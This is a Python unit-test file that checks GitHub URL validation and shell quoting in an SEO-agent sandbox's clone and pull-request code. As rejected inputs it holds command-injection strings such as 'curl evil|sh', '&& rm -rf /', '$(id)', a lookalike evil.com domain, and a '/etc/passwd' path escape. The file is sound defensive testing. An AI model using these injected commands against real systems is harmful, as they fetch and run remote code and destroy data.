"""Shell-safety of clone/PR commands and strict GitHub URL validation."""

import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch

from seo_agents.sandbox.clone import clone_command, clone_repo, repo_folder
from seo_agents.sandbox.in_container import site_model_files
from seo_agents.sandbox.pr import create_pr, safe_relative
from seo_agents.sandbox.tools.local import LocalResult
from seo_agents.sandbox.validate import is_valid_github_url


class GithubUrlValidationTests(unittest.TestCase):
    def test_accepts_plain_repository_urls(self):
        for url in ('https://github.com/owner/repo', 'https://github.com/owner/repo/',
                    'https://github.com/my-org/my.repo_name.git'):
            self.assertTrue(is_valid_github_url(url), url)

    def test_rejects_injection_and_non_repository_urls(self):
        for url in ('https://github.com/a/b;curl evil|sh', 'https://github.com/a/b && rm -rf /',
                    'https://github.com/a/b$(id)', 'https://github.com/a/b`id`', 'https://github.com/a/b?x=1',
                    'https://github.com/a/b#frag', 'https://github.com/a/b/c', 'http://github.com/a/b',
                    'https://github.com.evil.com/a/b', 'https://github.com/a', 'https://github.com/a/b c', None):
            self.assertFalse(is_valid_github_url(url), url)

    def test_clone_refuses_invalid_url_before_running_anything(self):
        runner = Mock()
        with self.assertRaises(ValueError):
            clone_repo(runner, 'https://github.com/a/b;curl evil|sh')
        runner.run.assert_not_called()


class ShellQuotingTests(unittest.TestCase):
    def test_quoted_clone_command_neutralises_metacharacters(self):
        hostile_target = "/tmp/x; echo INJECTED > pwned"
        command = clone_command('https://github.com/a/b', hostile_target)
        with tempfile.TemporaryDirectory() as directory:
            # Replace rm/mkdir/git with stubs so nothing touches the network or filesystem.
            script = 'rm() { :; }\nmkdir() { :; }\ngit() { printf "%s\\0" "$@"; }\n' + command
            result = subprocess.run(['bash', '-c', script], cwd=directory, capture_output=True)
            self.assertEqual(result.returncode, 0, result.stderr.decode())
            self.assertEqual(list(Path(directory).iterdir()), [])
        args = result.stdout.decode().split('\0')[:-1]
        self.assertEqual(args, ['clone', '--depth', '1', '--', 'https://github.com/a/b', hostile_target])

    def test_pr_commands_quote_paths_and_reject_escaping_files(self):
        with self.assertRaises(ValueError):
            safe_relative('../outside.json')
        with self.assertRaises(ValueError):
            safe_relative('/etc/passwd')
        runner = Mock()

        def run(command, env=None):
            if command == 'gh api user -q .login':
                return LocalResult('example-owner', '', 0)
            if command.endswith('-q .default_branch'):
                return LocalResult('main', '', 0)
            if command.startswith('gh pr create '):
                return LocalResult('https://github.com/example-owner/example-site/pull/2', '', 0)
            return LocalResult('', '', 0)
        runner.run.side_effect = run
        files = {'seo_reports/site_model/pages/p_1 $(id).json': '{}', 'seo_reports/site_model/index.json': '{}'}
        with patch('seo_agents.sandbox.pr.login_env', return_value={}):
            url = create_pr(runner, 'https://github.com/example-owner/example-site', reports={}, extra_files=files)
        self.assertTrue(url.endswith('/pull/2'))
        add = next(args[0] for args, _ in runner.run.call_args_list if ' git add ' in args[0])
        self.assertIn("'seo_reports/site_model/pages/p_1 $(id).json'", add)
        writes = [args[0] for args, _ in runner.write.call_args_list]
        self.assertIn(repo_folder('https://github.com/example-owner/example-site') + '/seo_reports/site_model/index.json', writes)
        self.assertNotIn('.seo_agents/readme.md', ' '.join(writes))
        push = next(args[0] for args, _ in runner.run.call_args_list if ' git push ' in args[0])
        self.assertNotIn('--force', push)
        self.assertIn('HEAD:refs/heads/seo-agents/', push)

    def test_same_repo_name_under_two_owners_never_shares_a_checkout(self):
        self.assertNotEqual(repo_folder('https://github.com/alice/site'), repo_folder('https://github.com/bob/site'))
        self.assertIn('rm -rf', clone_command('https://github.com/alice/site', repo_folder('https://github.com/alice/site')))

    def test_site_model_files_are_mapped_under_seo_reports(self):
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            (root / 'pages').mkdir()
            (root / 'index.json').write_text('{"a": 1}')
            (root / 'pages' / 'p_1.json').write_text('{}')
            files = site_model_files(directory)
        self.assertEqual(sorted(files), ['seo_reports/site_model/index.json', 'seo_reports/site_model/pages/p_1.json'])
        self.assertEqual(site_model_files(None), {})


if __name__ == '__main__':
    unittest.main()
